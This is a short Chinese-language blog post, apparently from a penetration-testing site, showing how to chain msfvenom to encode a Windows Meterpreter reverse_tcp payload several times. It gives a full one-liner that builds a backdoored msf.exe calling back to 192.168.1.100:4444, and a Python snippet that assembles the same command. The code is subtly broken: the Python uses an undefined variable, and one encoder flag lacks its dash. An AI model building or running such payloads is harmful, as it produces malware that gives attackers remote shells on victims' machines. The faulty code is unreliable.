---
title: "msfvenom 多重编码"
date: 2018-06-20T00:00:00+08:00
draft: false
tags: ["metasploit"]
categories: ['内网渗透']
author: "X1r0z"

# weight: 1  # Top page

# You can also close(false) or open(true) something for this content.
# P.S. comment can only be closed
comment: false
toc: false
autoCollapseToc: false
---

除第一次需要指定 payload 外, 其他都用 `-p -` 代替, 多重编码需要指定 `--platform` 和 `-a` 并用 `-f raw` 输出, 最后一次编码更改为 `-f exe`

<!--more-->

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f raw | msfvenom -p - -e x86/jmp_call_additive -i 2 -a x86 --platform windows -f raw | msfvenom -p - e x86/alpha_upper -i 1 -a x86 --platform windows -f exe > msf.exe
```

Python 实现

```
args = 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 '
encoders = {'x86/shikata_ga_nai': '5', 'x86/jmp_call_additive': '2', 'x86/alpha_upper': '1'}

for c in list(encoders.keys())[:-1]:
	encs += '-e ' + c + ' -i ' + encoders.get(c) + ' -a x86 --platform windows -f raw | msfvenom -p - '

encs += '-e ' + list(encoders.keys())[-1] + ' -i ' + encoders.get(list(encoders.keys())[-1]) + ' -a x86  --platform windows '
args += encs + '-f exe > msf.exe'
```